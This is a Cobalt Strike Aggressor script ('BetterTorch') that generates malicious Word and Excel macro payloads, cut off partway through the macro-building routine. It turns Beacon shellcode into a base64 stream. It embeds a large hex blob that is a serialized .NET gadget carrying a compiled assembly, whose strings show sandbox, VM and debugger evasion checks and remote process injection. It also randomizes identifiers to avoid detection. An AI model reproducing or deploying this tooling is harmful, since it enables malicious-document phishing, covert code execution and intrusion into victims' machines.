# BetterTorch plugin for Cobalt Strike targeted at Word/Excel
# Author: Ryan Linn (@sussurro)
# CactusTorch Author: Vincent Yiu (@vysecurity)
# Credits to @armitagehacker for the original script

sub range
{
    return lambda(
   {
      return iff($begin <= $end, $begin++ - 1, $null);
   }, $begin => $1, $end => $2);
}


sub random_string {
	local('$length $clen @chars');
	@firstchar = split("","ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
	@chars = split("","ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
	$clen = size(@chars);
	$length = $1;
	$str = "";
	$str = $str . rand(@firstchar);
	foreach $value (range(2,$length)){
		$str = $str . rand(@chars);
	}
	return $str;
}


sub setup_attack {
	local('%options $script $url $payload');
	%options = $3;

	# Stageless variable = %options["stageless"];
	# Type variable = %options["type"]

	# Generate a raw powershell payload depending on type

	if (%options["stageless"] eq "true"){
		# Generate stageless payload
		artifact_stageless(%options["listener"], "raw", "x86", $null, $this);
		yield;
		$payload = $1;
	}
	else{
		# Generate staged payload
		$payload = shellcode(%options["listener"], "true", "x86");
	}

	# $payload now has my shellcode in raw

	$b64payload = base64_encode($payload);
	$hexdata = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C64657209020000000903000000090400000004020000003053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727907000000047479706508617373656D626C79067461726765741274617267657454797065417373656D626C790E746172676574547970654E616D650A6D6574686F644E616D650D64656C6567617465456E747279010102010101033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727906050000002F53797374656D2E52756E74696D652E52656D6F74696E672E4D6573736167696E672E48656164657248616E646C657206060000004B6D73636F726C69622C2056657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530383906070000000774617267657430090600000006090000000F53797374656D2E44656C6567617465060A0000000D44796E616D6963496E766F6B650A04030000002253797374656D2E44656C656761746553657269616C697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300307033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E747279022F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C646572090B000000090C000000090D00000004040000002F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C64657207000000044E616D650C417373656D626C794E616D6509436C6173734E616D65095369676E61747572650A5369676E6174757265320A4D656D626572547970651047656E65726963417267756D656E747301010101010003080D53797374656D2E547970655B5D090A0000000906000000090900000006110000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B652853797374656D2E4F626A6563745B5D2906120000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B652853797374656D2E4F626A6563745B5D29080000000A010B0000000200000006130000002053797374656D2E586D6C2E536368656D612E586D6C56616C756547657474657206140000004D53797374656D2E586D6C2C2056657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530383906150000000774617267657430090600000006170000001A53797374656D2E5265666C656374696F6E2E417373656D626C790618000000044C6F61640A0F0C000000003A0000024D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300000000000000000000000000E00002210B0108000032000000060000000000009E51000000200000006000000000400000200000000200000400000000000000040000000000000000A000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000505100004B000000006000002C03000000000000000000000000000000000000008000000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000A4310000002000000032000000020000000000000000000000000000200000602E727372630000002C030000006000000004000000340000000000000000000000000000400000402E72656C6F6300000C000000008000000002000000380000000000000000000000000000400000420000000000000000000000000000000080510000000000004800000002000500B42700009C29000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001E02281100000A2A6A03280100000A6F0200000A17280300000A3902000000172A162A7A7E0400000A280100000A6F0200000A17280300000A3902000000162A172A0000133004006501000001000011730500000A0A1F208D0200000125167201000070A225177253000070A2251872A3000070A2251972F1000070A2251A7243010070A2251B7293010070A2251C72DF010070A2251D7237020070A2251E728B020070A2251F0972DB020070A2251F0A7235030070A2251F0B7285030070A2251F0C72DD030070A2251F0D7235040070A2251F0E7295040070A2251F0F72E5040070A2251F10723B050070A2251F117291050070A2251F1272E1050070A2251F137237060070A2251F14727B060070A2251F1572BF060070A2251F167205070070A2251F177247070070A2251F187299070070A2251F1972E7070070A2251F1A7239080070A2251F1B7291080070A2251F1C72E1080070A2251F1D723F090070A2251F1E7289090070A2251F1F72CD090070A20B070D161304381D0000000911049A0C08280600000A390700000006086F0700000A1104175813041104098E693FD9FFFFFF066F0800000A3A02000000162A172A00000013300600E000000002000011730500000A0A1B8D02000001251672170A0070A2251772250A0070A2251872330A0070A2251972410A0070A2251A724F0A0070A20B280900000A0C0813041613053880000000110411059A0D071307161308385E000000110711089A1306096F0A00000A6F0B00000A6F0C00000A11066F0C00000A6F0D00000A393000000006096F0A00000A6F0B00000A725D0A007072670A0070280E00000A178D0A00000125161F3A9D6F0F00000A6F0700000A110817581308110811078E693F97FFFFFF110517581305110511048E693F75FFFFFF066F0800000A3A02000000162A172A3A281000000A3902000000172A162A1E02281100000A2A0013300200950000000300001173010000060A034505000000050000001C00000032000000480000005E000000386F00000006046F020000063A0600000017281500000A3858000000066F030000063A0600000017281500000A3842000000066F04000006390600000017281500000A382C000000066F05000006390600000017281500000A3816000000066F06000006390600000017281500000A38000000002A0000001B300400600000000400001103281600000A0A7E1700000A068E6917586A281800000A20003000001F40280C0000060B061607068E69281900000A07D006000002281A00000A281B00000A74060000020C086F2000000626DD0E00000007162000800000280800000626DC2A01100000020024002D51000E0000000013300500510000000500001104281600000A0A731C00000A0B160C381E000000070608910308036F1D00000A5D6F1E00000A61D16F1F00000A260817580C08068E693FD9FFFFFF282000000A076F0B00000A6F2100000A282200000A2A000000133005004200000006000011731C00000A0A160B38220000000604076F1E00000A0307036F1D00000A5D6F1E00000A61D16F1F00000A260717580B07046F1D00000A3FD2FFFFFF066F0B00000A2A0000133005006A00000007000011732300000A0A732400000A0B160C384E000000038D0A0000010D1613043824000000091104726F0A007006726F0A0070281D00000A6F2500000A281E00000A9D1104175813041104098E693FD2FFFFFF0709732600000A6F2700000A260817580C08043FABFFFFFF072A3A020304281B000006732800000A2A000000133005006600000008000011036F1D00000A0A06282900000A04282900000A282A00000A282B00000A282C00000A0B078D020000010C060D16130438280000000904282D00000A13050411045A130608110403110611056F2E00000AA2091105590D1104175813041104073FD0FFFFFF082A000013300A00C20000000900001104281600000A0A1201FE150B0000021202FE150A00000203147E1700000A7E1700000A161A7E1700000A141201120228110000060D12027B420000047E1700000A068E697E060000047E08000004280E00000613047E1700000A130512027B42000004110406068E691205280A00000613061F101612027B450000042809000006130716130812027B420000041104068E697E09000004120828140000061306110411077E1700000A280B000006130912027B43000004130A110A2812000006262A00001B300500CD0000000A00001104281600000A0A03282F00000A169A0B1F3816076F3000000A28100000060C087E1700000A068E697E060000047E07000004280E0000060D7E1700000A1304080906068E691204280A00000613051613060809068E697E09000004120628140000061305076F3100000A6F3200000A1308382E00000011086F3300000A742000000113071F1A1611076F3400000A280900000613090911097E1700000A280B000006130A11086F3500000A3AC6FFFFFFDD170000001108752400000125130B3907000000110B6F3600000ADC2A000000011000000200710044B50017000000007E200010000080060000041F4080070000041A80080000041F2080090000042A42534A4201000100000000000C00000076322E302E35303732370000000005006C000000200C0000237E00008C0C0000A80E000023537472696E677300000000341B0000F00A00002355530024260000100000002347554944000000342600006803000023426C6F620000000000000002000010571D021C0902000000FA013300160000010000002E0000000C0000006300000022000000490000003A000000430000000C0000000A00000002000000010000000D00000001000000020000000900000000008D0E010000000000060019062C060A006F0676060A00840676060A009B06A2060A00C306C8060600E7062C06060023072C060A0033077606060054075A070A00810776060A008E0797070A00B907CD070A00EC0776060A00FB07CD070A001D08CD070A00800A76060A009D0A76060A00B60A76060A00C20A76060A00D60ACD070A00E30A76060A00FA0A76060A002A0B76060A003D0B4B0B0A00730B4B0B0A00AB0B76060A00B20BBC0B0A00E60BBC0B0A00F20B76060A00120C760606004C0C970706006E0C97070A007C0CBC0B0600940C97070A00AC0CBC0B0A00E60C76060A00760D76060A008E0D76060A009B0D76060A00B30D76060A00C50D76060A00E60DCD070A00F40D110E0A00230E9707B300370E00000A00460E640E0000000001000000000001000100000010000A0000002100010001000100100016000000210001000700020100002500000095000A001F000201000034000000950013001F000201000045000000A1001F001F00020100005500000095001F002300020100005E00000095002200230002010000710000009500300023000A01100086000000A500420023000A0110009A000000A5004600230002010000A60000009500580023005180BB0004005180D10004005180EB00040051800001040051801101040011002101010011002C0101001100430101001100520101000606B300010056806401070056806B01070056807301070056807601070056807C01070056808801070056809101070056809A0107000606B30001005680A6010B005680AE010B005680BB010B005680CD010B005680DF010B005680E8010B005680F1010B005680FB010B00568005020B00568018020B0056802D020B000606B3000100568047020F00568054020F000606B300010056806002130056806402130056806E02130056807B0213005680920213005680A40213005680B70213005680C70213005680D50213005680DE0213005680ED0213005680FE0213005680160313000606B300010056802203170056802C03170056804603170056806003170056807303170056808C03170056809D0317005680B60317005680D70317005680EF03170056800504170056801604170056803104170056804904170056805704170056806804170056808504170006009D041B000600A6041B000600AE0401000600BA0401000600C50401000600C8041E000600D3041E000600DD041E000600E50401000600E90401000600ED0401000600F50401000600FD04010006000B05010006001905010006002905010006003105210006003D052100060049051B00060055051B0006005F051B0006006A051B000606B300040056807405240056807E05240056808D0524005680990524005680A50524005680B50524005680C70524005680D80524005680E40524005680F90524005680070624005020000000008618BD063F0001005820000000008600FA0C5D0001007320000000008600030DC10102009420000000008600120DC101020008220000000086002B0DC1010200F422000000008600340DC10102000323000000008618BD063F00020000000000800091204D08EA01020000000000800096207E08F20105000000000080009620B508FA0108000000000080009620FC0805020D00000000008000912017090C0210000000000080009620170916021400000000008000962050091E02180000000000800096205F0927021D0000000000800096205F092F0220000000000080009620C7023602230000000000800096202E0A49022D0000000000800096203B0A49022E000000000080009620490A4E022F000C230000000086003F0D58023400B023000000008600450D630236002C240000000086004C0D700237008C240000000086004F0D70023900DC24000000008600510D84023B005225000000008600530D96023D006425000000008600550D9D023F00D825000000008600600DAF024100A826000000008600670DAF02430094270000000091186F0DDD0245000000000003008618BD06E1024500000000000300C6017B0D4E004700000000000300C601820DE7024700000000000300C601A90DF1024900000001001206000001006208000002006C0800000300730800000100960800000200A60800000300BA04000001009D0400000200C80800000300D60800000400DF0802000500E50800000100090900000200A604000003001009000001006208000002006C08000003002409000004003509000001003F09000002004B09000003002409000004003509000001009D04000002006208000003006C08000004002409000005003509000001006B0900000200A60800000300790900000100960800000200A60800000300AE0400000100830900000200950900000300A30900000400B70900000500CA0900000600DA0900000700EA0900000800F809000009000B0A02000A00190A00000100A60400000100A604000001009D04000002006208000003006C08000004005A0A02000500670A00000100760A000002007C0A00000100910A00000100330B00000200370B00000100330B00000200370B000001009E0B00000200A50B00000100D40B00000200DC0B00000100D40B00000200DC0B000001002D0C00000200380C00000100440C00000200380C000001002F08000002003608000001003D08000002002F0800000100460809004A062800090060062D0011007D063100110095061E000C00BD063F002900D20643000C00D90648000C00DD064E003100F806520031001007580041003A072D00110043072D0011004B075D004900790762001100860769005900AA076F004100BD063F006100BD0673006900BD063F007100BD06DD0081008C0A28018900A50A2D019100BD0A1B009900CA0A3301A100DE0A3801A900E80A4101A1000C0B4801C100BD063F001100570B4E001100620B5001C1006C0B5501C9007C0B5B01C900860B600189008F0B6601D100BD063F00D900BD063F00D100CF0B6C011100BD067101D900D9067701D900BD067C01E900FA0B8201E900060C8801F100170C9101E900CA0A9801F1001F0C9E011100230CA401F900540CAA01F900670C4E00F900880CB1011901C30CB7010901D10CBD010101670C4E000901DD0CC1012101F20C3F005101BD0663025901BD0663026101BD0637037101BD063F00080004007E0008000800830008000C008800080010008D0008001400920009002C009C0009003000A10009003400A60009003800AB0009003C00B00009004000B50009004400BA0009004800BF00090050009200090054008D0009005800C40009005C00C900090060009700090064007E0009006800CE0009006C00880009007000D30009007400D80009007800830009008000EC0009008400F10009008C00F600090090009700090094007E0009009800880009009C0092000900A0008D000900A400C4000900A800C9000900AC00D3000900B000D8000900B40083000900B8009C000900BC00BA000900C400FB000900C80000010900CC0005010900D00092000900D400D8000900D8000A010900DC000F010900E00014010900E4009C000900E8009C000900EC00CE000900F00083000900F4007E000900F80097000900FC00880009000001AB00090004011901080064019700080068017E0008006C018800080070019200080074018D0008007801C40008007C01C90008008001D30008008401D800080088011E0108008C0123012E009300F8022E00BB01FE022E00C3012A032E00CB01E3002E00D3013E0363009300780083009B009700A3009B009700C300A300E30003019B00970023019B00970083019B009700C501D3015E02680276027E028B02A402B502C602590889083900000111004D080100400113007E08020040011500B508020000011700FC080200400119001709020000011B001709010040011D005009020040011F005F090200400121005F09020000012300C7020200000125002E0A0200000127003B0A020000012900490A0200048000000100000000000000000000000000CF0D00000200000000000000000000005D037606000000000200000000000000000000005D03840E000000000400030005000300060003000700030008000300090003000A0003000B0003000C00030000000000003C4D6F64756C653E00436865636B506C65617365004D7973746572794D616368696E6500416C6C6F636174696F6E54797065004D656D6F727950726F74656374696F6E004578656375746544656C65676174650046726565547970650050726F63657373416363657373466C6167730050726F636573734372656174696F6E466C6167730050524F434553535F494E464F524D4154494F4E0053544152545550494E464F005468726561644163636573730076616C75655F5F0050524F434553535F4352454154455F5448524541440050524F434553535F51554552595F494E464F524D4154494F4E0050524F434553535F564D5F4F5045524154494F4E0050524F434553535F564D5F57524954450050524F434553535F564D5F52454144004D454D5F434F4D4D495400504147455F455845435554455F52454144575249544500504147455F52454144575249544500504147455F455845435554455F5245414400434F4D4D4954005245534552564500474F005245534554004C415247455F504147455300504859534943414C00544F505F444F574E0057524954455F5741544348004558454355544500455845435554455F5245414400455845435554455F52454144575249544500455845435554455F5752495445434F5059004E4F41434345535300524541444F4E4C5900524541445752495445005752495445434F50590047554152445F4D6F646966696572666C6167004E4F43414348455F4D6F646966696572666C6167005752495445434F4D42494E455F4D6F646966696572666C6167004D454D5F4445434F4D4D4954004D454D5F52454C4541534500416C6C005465726D696E61746500437265617465546872656164005669727475616C4D656D6F72794F7065726174696F6E005669727475616C4D656D6F727952656164005669727475616C4D656D6F72795772697465004475706C696361746548616E646C650043726561746550726F636573730053657451756F746100536574496E666F726D6174696F6E005175657279496E666F726D6174696F6E0051756572794C696D69746564496E666F726D6174696F6E0053796E6368726F6E697A65005A45524F5F464C4147004352454154455F425245414B415741595F46524F4D5F4A4F42004352454154455F44454641554C545F4552524F525F4D4F4445004352454154455F4E45575F434F4E534F4C45004352454154455F4E45575F50524F434553535F47524F5550004352454154455F4E4F5F57494E444F57004352454154455F50524F5445435445445F50524F43455353004352454154455F50524553455256455F434F44455F415554485A5F4C4556454C004352454154455F53455041524154455F574F575F56444D004352454154455F5348415245445F574F575F56444D004352454154455F53555350454E444544004352454154455F554E49434F44455F454E5649524F4E4D454E540044454255475F4F4E4C595F544849535F50524F434553530044454255475F50524F434553530044455441434845445F50524F4345535300455854454E4445445F53544152545550494E464F5F50524553454E5400494E48455249545F504152454E545F414646494E495459006850726F63657373006854687265616400647750726F6365737349640064775468726561644964006362006C705265736572766564006C704465736B746F70006C705469746C6500647758006477590064775853697A650064775953697A6500647758436F756E74436861727300647759436F756E74436861727300647746696C6C417474726962757465006477466C616773007753686F7757696E646F77006362526573657276656432006C705265736572766564320068537464496E70757400685374644F757470757400685374644572726F72005445524D494E4154450053555350454E445F524553554D45004745545F434F4E54455854005345545F434F4E54455854005345545F494E464F524D4154494F4E0051554552595F494E464F524D4154494F4E005345545F5448524541445F544F4B454E00494D504552534F4E415445004449524543545F494D504552534F4E4154494F4E005448524541445F48494A41434B005448524541445F414C4C00646F6D61696E004950476C6F62616C50726F706572746965730053797374656D2E4E65742E4E6574776F726B496E666F726D6174696F6E004765744950476C6F62616C50726F70657274696573006765745F446F6D61696E4E616D6500537472696E670053797374656D00457175616C7300537472696E67436F6D70617269736F6E00456D707479004C69737460310053797374656D2E436F6C6C656374696F6E732E47656E65726963002E63746F720046696C650053797374656D2E494F0045786973747300416464006765745F436F756E74004E6574776F726B496E7465726661636500476574416C6C4E6574776F726B496E746572666163657300476574506879736963616C4164647265737300506879736963616C41646472657373004F626A65637400546F537472696E6700546F4C6F77657200436F6E7461696E730052656765780053797374656D2E546578742E526567756C617245787072657373696F6E73005265706C6163650043686172005472696D456E640044656275676765720053797374656D2E446961676E6F7374696373006765745F4973417474616368656400436F6D56697369626C654174747269627574650053797374656D2E52756E74696D652E496E7465726F70536572766963657300466C61677341747472696275746500556E6D616E6167656446756E6374696F6E506F696E7465724174747269627574650043616C6C696E67436F6E76656E74696F6E006F626A656374006D6574686F640063616C6C6261636B00726573756C74005669727475616C46726565006B65726E656C3332006C704164647265737300647753697A650064774672656554797065004F70656E546872656164006B65726E656C33322E646C6C006477446573697265644163636573730062496E686572697448616E646C6500577269746550726F636573734D656D6F7279006C704261736541646472657373006C70427566666572006E53697A65006C704E756D6265724F6642797465735772697474656E005175657565557365724150430070666E41504300647744617461005669727475616C416C6C6F6300666C416C6C6F636174696F6E5479706500666C50726F74656374006C705374617274416464720073697A65005669727475616C416C6C6F634578004F70656E50726F636573730070726F636573734163636573730070726F636573734964006C704170706C69636174696F6E4E616D65006C70436F6D6D616E644C696E65006C7050726F6365737341747472696275746573006C70546872656164417474726962757465730062496E686572697448616E646C65730064774372656174696F6E466C616773006C70456E7669726F6E6D656E74006C7043757272656E744469726563746F7279006C7053746172747570496E666F006C7050726F63657373496E666F726D6174696F6E00526573756D655468726561640053757370656E64546872656164005669727475616C50726F74656374457800666C4E657750726F74656374006C70666C4F6C6450726F7465637400636865636B0061726700456E7669726F6E6D656E740045786974007368656C6C636F6465363400436F6E766572740046726F6D426173653634537472696E6700496E74507472005A65726F0055496E74507472006F705F4578706C69636974004D61727368616C00436F70790054797065004765745479706546726F6D48616E646C650052756E74696D655479706548616E646C650047657444656C6567617465466F7246756E6374696F6E506F696E7465720044656C6567617465006B657900696E70757400537472696E674275696C6465720053797374656D2E54657874006765745F4C656E677468006765745F436861727300417070656E6400456E636F64696E67006765745F415343494900476574427974657300546F426173653634537472696E67006C656E67746800636F756E740052616E646F6D0041727261794C6973740053797374656D2E436F6C6C656374696F6E73004E65787400746F53706C6974006368756E6B53697A650049436F6C6C656374696F6E00446563696D616C006F705F496D706C69636974006F705F4469766973696F6E004D617468004365696C696E67004D696E00537562737472696E670062696E61727950617468007368656C6C636F646533320070726F636573730050726F636573730047657450726F63657373657342794E616D65006765745F49640050726F636573735468726561640049456E756D657261746F72006765745F546872656164730050726F63657373546872656164436F6C6C656374696F6E00526561644F6E6C79436F6C6C656374696F6E4261736500476574456E756D657261746F72006765745F43757272656E74004D6F76654E6578740049446973706F7361626C6500446973706F7365006973446F6D61696E006973446F6D61696E4A6F696E656400636F6E7461696E7353616E64626F784172746966616374730069734261644D616300697344656275676765640076656C6D6100646170686E65007862007800720073004368756E6B53706C69740073636F6F62790073637261707079002E6363746F7200456E756D00496E766F6B6500426567696E496E766F6B6500494173796E63526573756C74004173796E6343616C6C6261636B00456E64496E766F6B65004D756C74696361737444656C65676174650056616C756554797065004D7973746572794D616368696E65417373656D626C79004775696441747472696275746500417373656D626C7946696C6556657273696F6E4174747269627574650053797374656D2E5265666C656374696F6E0044656275676761626C6541747472696275746500446562756767696E674D6F6465730052756E74696D65436F6D7061746962696C6974794174747269627574650053797374656D2E52756E74696D652E436F6D70696C65725365727669636573006D73636F726C6962004D7973746572794D616368696E65417373656D626C792E646C6C00005143003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0056006D006D006F007500730065002E00730079007300004F43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D003300640067006C002E0064006C006C00004D43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D00640075006D002E0064006C006C00005143003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D00330064007600650072002E0064006C006C00004F43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D0074007200610079002E0064006C006C00004B43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D00630069002E00730079007300005743003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D007500730062006D006F007500730065002E00730079007300005343003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D0078005F0073007600670061002E00730079007300004F43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D0078006E00650074002E00730079007300005943003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0056004D0054006F006F006C00730048006F006F006B002E0064006C006C00004F43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D0068006700660073002E0064006C006C00005743003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D006D006F007500730065007600650072002E0064006C006C00005743003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D00470075006500730074004C00690062002E0064006C006C00005F43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0056006D00470075006500730074004C00690062004A006100760061002E0064006C006C00004F43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C0076006D0073006300730069002E00730079007300005543003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C00560042006F0078004D006F007500730065002E00730079007300005543003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C00560042006F007800470075006500730074002E00730079007300004F43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C00560042006F007800530046002E00730079007300005543003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C0044007200690076006500720073005C00560042006F00780056006900640065006F002E00730079007300004343003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F00780064006900730070002E0064006C006C00004343003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F00780068006F006F006B002E0064006C006C00004543003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F0078006D00720078006E0070002E0064006C006C00004143003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F0078006F0067006C002E0064006C006C00005143003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F0078006F0067006C00610072007200610079007300700075002E0064006C006C00004D43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F0078006F0067006C00630072007500740069006C002E0064006C006C00005143003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F0078006F0067006C006500720072006F0072007300700075002E0064006C006C00005743003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F0078006F0067006C0066006500650064006200610063006B007300700075002E0064006C006C00004F43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F0078006F0067006C007000610063006B007300700075002E0064006C006C00005D43003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F0078006F0067006C0070006100730073007400680072006F007500670068007300700075002E0064006C006C00004943003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F00780073006500720076006900630065002E00650078006500004343003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00760062006F00780074007200610079002E00650078006500004943003A005C00770069006E0064006F00770073005C005300790073006E00610074006900760065005C00560042006F00780043006F006E00740072006F006C002E00650078006500000D300030003000430032003900000D300030003100430031003400000D300030003500300035003600000D300030003000350036003900000D30003800300030003200370000092E007B0032007D000007240030003A00007D4100420043004400450046004700480049004A004B004C004D004E004F0050005100520053005400550056005700580059005A006100620063006400650066006700680069006A006B006C006D006E006F0070007100720073007400750076007700780079007A00300031003200330034003500360037003800390000000000FC48D92EA000B248B121DE42A3760EB90002060902060803061110030611140306111C030611200306112402061802060E0206060306113004000012050320000E070003020E0E110D05151211010E03200001040001020E052001011300032000080500001D1219042000121D042001020E0600030E0E0E0E0520010E1D03030000020420010102050100010000040200000004000400000408000000042000000004100000000401000000040010000004002000000400300000040000080004000000200400004000040000100004000020000440000000048000000004040000000400010000040002000005200101113D0801000200000000000400400000040080000004FF0F1F000400000000040000000104000000040400000008040000040004000000020400000100041A00000004FB03000004000101080500011D050E040001190B080004011D0508180806000112551159070002125D181255042001030805200112610304000012650520011D050E0500010E1D050420010808052001011D03042001081C052001011271050001117508080002117511751175060001117511750500010811750500020808080520020E08080600011D127D0E0520001280890520001280850320001C032000020D0705151211010E1D0E0E1D0E08160709151211010E1D0E1D121912191D1219080E1D0E08070003021809111C07000318113002080A00050218181D050810180600031818181809000418181911101114070004180908090908000518181808090907000318112002080600031808020812000A020E0E1818021124180E10112C10112804000109180900050218180809100905200201080E0407011208042001010E0707031D051812180520020E0E0E0707031D05126108050702126108062002126D08080A07051269126D081D0308062002126D0E080620021D1C0E080A070708081D0E08080808052002010E0E10070B1D05112C1128021818021809181816070C1D05127D1818180209128081128085181812809103000001052002011C1809200212809912809D1C062001081280990501000000002B0100267B34364331363641412D333130382D313144342D393334382D3030433034463845454237317D00000C010007312E302E302E300000062001011180B51E01000100540216577261704E6F6E457863657074696F6E5468726F77730108B77A5C561934E08900007851000000000000000000008E510000002000000000000000000000000000000000000000000000805100000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058600000D40200000000000000000000D40234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000007F00B00434020000010053007400720069006E006700460069006C00650049006E0066006F0000001002000001003000300037006600300034006200300000001C000200010043006F006D006D0065006E007400730000002000000024000200010043006F006D00700061006E0079004E0061006D00650000000000200000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000050001700010049006E007400650072006E0061006C004E0061006D00650000004D007900730074006500720079004D0061006300680069006E00650041007300730065006D0062006C007900000000002800020001004C006500670061006C0043006F0070007900720069006700680074000000200000002C00020001004C006500670061006C00540072006100640065006D00610072006B007300000000002000000060001B0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004D007900730074006500720079004D0061006300680069006E00650041007300730065006D0062006C0079002E0064006C006C0000000000240002000100500072006F0064007500630074004E0061006D0065000000000020000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000C000000A03100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010D00000004000000091800000009060000000917000000061B0000002753797374656D2E5265666C656374696F6E2E417373656D626C79204C6F616428427974655B5D29061C0000002E53797374656D2E5265666C656374696F6E2E417373656D626C79204C6F61642853797374656D2E427974655B5D29080000000A0B";
	# Now it's base64 encoded
	$decode = random_string(5);
	$binhex = random_string(5);
	$xmldom = random_string(5);
	$classname = random_string(5);
	$memstream = random_string(5);
	$arraylist = random_string(5);
	$binformat = random_string(5);
	$binary = random_string(5);
	$code = random_string(5);
	$sheet = random_string(5);


	$dictstr = $binhex  . "|bin.hex," . $xmldom . "|Microsoft.XMLDOM," . $classname . "|MysteryMachine," . $memstream . "|System.IO.MemoryStream," . $arraylist . "|System.Collections.ArrayList," . $binformat . "|System.Runtime.Serialization.Formatters.Binary.BinaryFormatter," . $binary . "|" .  %options["binary"];

	$data = "";


		# They want VBA Macros

		# We need to take the base64 stream and chunk it up into format:
		# code = code & \"chunk\"\
		$word = 0;
		if(%options["type"] eq "Word"){
			$word = 1;
		}
		$insert = "";
		$i = 1;
